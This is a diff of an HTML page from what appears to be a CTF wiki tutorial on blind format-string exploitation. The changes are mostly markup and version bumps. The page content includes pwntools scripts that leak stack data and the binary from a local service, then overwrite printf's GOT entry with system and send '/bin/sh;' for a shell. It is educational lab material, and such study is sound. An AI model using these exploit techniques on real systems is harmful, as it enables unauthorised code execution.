 <h4 id="determine-the-number-of-programs">Determine the number of programs<a class="headerlink" href="#determine-the-number-of-programs" title="Permanent link">&para;</a></h4>
 <p>We randomly entered %p and the program echoed the following information.</p>
-<div class="codehilite"><pre><span></span>➜  blind_fmt_stack git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
+<div class="codehilite"><pre><span></span><code>➜  blind_fmt_stack git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
 
 %p
 
 0x7ffd4799beb0
 
 G�flag is on the stack%                          
-</pre></div>
+</code></pre></div>
 
 <p>Tell us that the flag is on the stack and that the program is 64-bit and that there should be a format string vulnerability.</p>
 <h4 id="use">Use<a class="headerlink" href="#use" title="Permanent link">&para;</a></h4>
 <p>Then let&#39;s take a little test and see</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
 
@@ -6234,10 +6234,10 @@ G�flag is on the stack%
     <span class="n">leak</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
     <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
-</pre></div>
+</code></pre></div>
 
 <p>Finally, I simply looked at the output and got the flag.</p>
-<div class="codehilite"><pre><span></span>////////
+<div class="codehilite"><pre><span></span><code>////////
 
 ////////
 
@@ -6248,33 +6248,33 @@ s_is_fla
 g<span class="o">}</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span>
 
 <span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span>fe<span class="se">\x</span>7f<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="example-2-blind-hijacking-got">Example 2 - Blind hijacking got<a class="headerlink" href="#example-2-blind-hijacking-got" title="Permanent link">&para;</a></h3>
 <p>The source code and deployment files are already in the <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got">blind_fmt_got</a> folder.</p>
 <h4 id="determine-the-number-of-programs_1">Determine the number of programs<a class="headerlink" href="#determine-the-number-of-programs_1" title="Permanent link">&para;</a></h4>
 <p>By simply testing, we found that this program is a format string vulnerability function, and the program is 64-bit.</p>
-<div class="codehilite"><pre><span></span>➜  blind_fmt_got git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
+<div class="codehilite"><pre><span></span><code>➜  blind_fmt_got git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
 
 %p
 
 0x7fff3b9774c0
-</pre></div>
+</code></pre></div>
 
 <p>This time, I didn&#39;t show it back. I tried it again and found that there was nothing wrong with it. Then we had to leak a wave of source programs.</p>
 <h4 id="determining-the-offset_2">Determining the offset<a class="headerlink" href="#determining-the-offset_2" title="Permanent link">&para;</a></h4>
 <p>Before the leak procedure, we still have to determine the offset of the format string, as follows</p>
-<div class="codehilite"><pre><span></span>➜  blind_fmt_got git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
+<div class="codehilite"><pre><span></span><code>➜  blind_fmt_got git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
 
 aaaaaaaa%p%p%p%p%p%p%p%p%p
 
 aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
-</pre></div>
+</code></pre></div>
 
 <p>Based on this, we can know that the starting address offset of the format string is 6.</p>
 <h4 id="leaking-binary">leaking binary<a class="headerlink" href="#leaking-binary" title="Permanent link">&para;</a></h4>
 <p>Since the program is 64-bit, we started leaking from 0x400000. In general, blind typing with a format string vulnerability can be read into the &#39;\x00&#39; character, otherwise it can&#39;t be revealed how to play, after that, the output must be truncated by &#39;\x00&#39;, this is because The output functions of the format string exploit are truncated by &#39;\x00&#39;. . So we can use the leak code below.</p>
-<div class="codehilite"><pre><span></span><span class="c1">##coding=utf8</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">##coding=utf8</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -6356,7 +6356,7 @@ aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x6161616161616161
     <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
 <span class="n">getbinary</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>It should be noted that in the payload, it is necessary to judge whether or not &#39;\n&#39; appears, because this will cause the source program to read only the previous content, and there is no way to leak the memory, so it is necessary to skip such an address.</p>
 <h4 id="ary">分析斌ary<a class="headerlink" href="#ary" title="Permanent link">&para;</a></h4>
@@ -6381,7 +6381,7 @@ seg000:0000000000400620                 mov     eax, 0</p>
 <p>seg000: 0000000000400631 mov rdi, rax
 seg000:0000000000400634                 call    near ptr unk_4004E0</p>
 <p>seg000:0000000000400639                 jmp     short loc_4005FE</p>
-<div class="codehilite"><pre><span></span>It can be basically determined that sub\_4004C0 is a read function, because the read function has a total of three parameters, which is basically read. In addition, the sub\_4004B0 called below should be the output function, and then a function should be called again, and then jump back to the read function, the program should be a while 1 loop, always executing.
+<div class="codehilite"><pre><span></span><code>It can be basically determined that sub\_4004C0 is a read function, because the read function has a total of three parameters, which is basically read. In addition, the sub\_4004B0 called below should be the output function, and then a function should be called again, and then jump back to the read function, the program should be a while 1 loop, always executing.
 
 
 #### Using ideas
@@ -6570,10 +6570,10 @@ sh.recv()
 sh.sendline(&#39;/bin/sh;&#39;)
 
 sh.interactive()
-</pre></div>
+</code></pre></div>
 
 <p>What needs to be noted here is this code.</p>
-<div class="codehilite"><pre><span></span><span class="c1">## modify printf_got</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">## modify printf_got</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
 
@@ -6602,11 +6602,11 @@ sh.interactive()
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>Fmtstr_payload directly get the payload will put the address in front, and this will lead to &#39;\x00&#39; truncation of printf (<strong>About this problem, pwntools is currently developing an enhanced version of fmt_payload, it is estimated that it will be developed soon </strong>). So I used some tricks to put it behind. The main idea is to place the address in the 8 byte alignment and modify the offset in the payload. have to be aware of is</p>
-<div class="codehilite"><pre><span></span><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
 
 <p>This line gives the offset of the modified address in the formatted string. The reason for this is that no matter how it is modified, the more characters in the order of &#39;%order$hn&#39; will not be greater than 8. Specific can be deduced by yourself.</p>
 <h3 id="title">Title<a class="headerlink" href="#title" title="Permanent link">&para;</a></h3>
@@ -6678,7 +6678,7 @@ sh.interactive()
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -6693,7 +6693,7 @@ sh.interactive()
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
